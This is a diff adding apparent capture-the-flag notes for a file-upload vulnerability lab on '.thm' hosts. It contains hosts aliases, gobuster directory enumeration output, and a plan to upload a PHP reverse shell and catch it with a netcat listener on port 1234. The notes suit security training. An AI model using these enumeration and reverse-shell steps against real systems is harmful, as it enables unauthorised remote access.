@@ -1,4 +1,34 @@
 ---------------------------------------------------------------------------------
-10.10.237.142
+10.10.121.202
 
 mv ~/Documents/rickroll_4k.jpg ./mountains.jpg
+# Hosts aliases
+10.10.121.202    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm
+
+
+---------------------------------------------------------------------------------
+└─$ gobuster dir -u http://shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://shell.uploadvulns.thm
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/resources            (Status: 301) [Size: 334] [--> http://shell.uploadvulns.thm/resources/]
+/assets               (Status: 301) [Size: 331] [--> http://shell.uploadvulns.thm/assets/]
+
+---------------------------------------------------------------------------------
+
+# Focus on the /resources dir.
+
+# Listen on the desired port (1234) and ppload the reverse shell (/php-reverse-shell.php)
+
+nc -lvnp 1234
